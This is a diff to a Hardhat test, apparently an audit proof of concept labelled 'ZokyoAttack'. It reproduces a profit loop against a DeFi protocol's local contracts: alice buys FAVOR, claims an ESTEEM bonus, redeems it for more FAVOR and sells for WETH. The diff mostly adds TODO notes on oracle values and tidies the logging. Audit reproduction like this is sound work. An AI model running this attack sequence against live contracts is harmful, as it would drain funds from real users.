@@ -22,12 +22,13 @@ describe('ZokyoAttack', () => {
 
 
         const minter = await ethers.deployContract("MintRedeemer", [esteem, startTime + 100, owner]);
-        // 0.1 ,  18 digitts fixed decimal point
+        // TODO:  check that esteem rate is realistic!!!! 0.1 ,  18 digitts fixed decimal point
         await minter.setEsteemRate(100_000_000_000_000_000n)
 
 
         let weth = await createToken(owner, 'wethweth', "t0");
         await minter.setPriceOracle(weth, mockOracle);
+        //  TODO:  check that this valueis realistic!!!!!
         await mockOracle.setLastPrice(weth, 1_000_000_000_000_000_000n);
 
         let v2factory = await createUSV2Factory(owner);
@@ -51,6 +52,7 @@ describe('ZokyoAttack', () => {
 
 
         // 1$
+        // TODO:  ckeck  whether this value is realistic!!!!!
         await mockOracle.setLastPrice(favorEth, 1_000_000_000_000_000_000n);
         //  alice is a rich girl
         await favorEth.transfer(alice, 1_000_000_000_000n);
@@ -85,6 +87,7 @@ describe('ZokyoAttack', () => {
         let genesis = (await ethers.provider.getBlock('latest'))?.timestamp || 0;
         const epochKeeper = await ethers.deployContract("EpochKeeper", [genesis, 3600, owner]);
 
+        // TODO:  check that price cap is realistic!!!!!
         const uniTwapOracle = await ethers.deployContract("UniTWAPOracle", [favorWethPair, 1000_000_000_000_000_000_000n, epochKeeper, owner]);
         await mockOracle.setTwapOracle(favorEth, uniTwapOracle);
 
@@ -133,8 +136,6 @@ describe('ZokyoAttack', () => {
         //  oracle is updated
         await expect(uniTwapOracle.update()).to.not.be.revert(ethers);
 
-        console.log("consult:", await uniTwapOracle.consult(favorEth, 1000n));
-
         return {
             zapper,
             favorEth,
@@ -170,38 +171,38 @@ describe('ZokyoAttack', () => {
 
 
             //  alice has a lot of WETH, 10% of pool value
-            console.log("alice has weth:", await weth.balanceOf(alice));
+            let initalWethBalance = await weth.balanceOf(alice);
+            console.log("alice has weth:", initalWethBalance);
             let initialFavorBalance = await favorEth.balanceOf(alice);
             console.log("alice has favor:", initialFavorBalance);
 
-            let initalWethBalance = await weth.balanceOf(alice);
             //  alice buys favor, 10% of pool value
             await weth.connect(alice).approve(zapper, 1_000_000_000_000n);
             console.log('allowance:', await weth.allowance(alice, zapper));
             await expect(zapper.connect(alice).buy(weth, 1_000_000_000_000n, 0n, Date.now())).to.not.be.revert(ethers);
 
-            console.log("alice bought favor:", await favorEth.balanceOf(alice));
+            console.log("alice bought favor:", await favorEth.balanceOf(alice) - initialFavorBalance);
 
             // alice claims bouns and receives favor
             await expect(favorEth.connect(alice).claimBonus()).to.not.be.revert(ethers);
             let aliceBalabceOfEsteem = await esteem.balanceOf(alice);
             console.log("alice claimed bonus and received esteem:", aliceBalabceOfEsteem);
 
-            // alice is smelting favor
+            // alice is smelting esteem for favor
             await esteem.connect(alice).approve(mintRedeemer, aliceBalabceOfEsteem);
             await expect(mintRedeemer.connect(alice).redeemFavor(aliceBalabceOfEsteem, favorEth)).to.not.be.revert(ethers);
 
-            let balancAfterSmelting = await favorEth.balanceOf(alice) - initialFavorBalance;
-            console.log("alice has favor after smelting:", balancAfterSmelting);
+            let earbedAfterSmelting = await favorEth.balanceOf(alice) - initialFavorBalance;
+            console.log("alice favor  earning after smelting:", earbedAfterSmelting);
 
             //  alice is selling this favor for ETH
-            await favorEth.connect(alice).approve(zapper, balancAfterSmelting);
-            await expect(zapper.connect(alice).sell(favorEth, balancAfterSmelting, 0, Date.now())).to.not.be.revert(ethers);
+            await favorEth.connect(alice).approve(zapper, earbedAfterSmelting);
+            await expect(zapper.connect(alice).sell(favorEth, earbedAfterSmelting, 0, Date.now())).to.not.be.revert(ethers);
 
             let wethBalanceAfterAttack = await weth.balanceOf(alice);
 
-            console.log("balace after attack:", wethBalanceAfterAttack);
-            console.log("attacj earns:", wethBalanceAfterAttack - initalWethBalance);
+            console.log("weth balance after attack:", wethBalanceAfterAttack);
+            console.log("weth earned:", wethBalanceAfterAttack - initalWethBalance);
         })
     });
 })
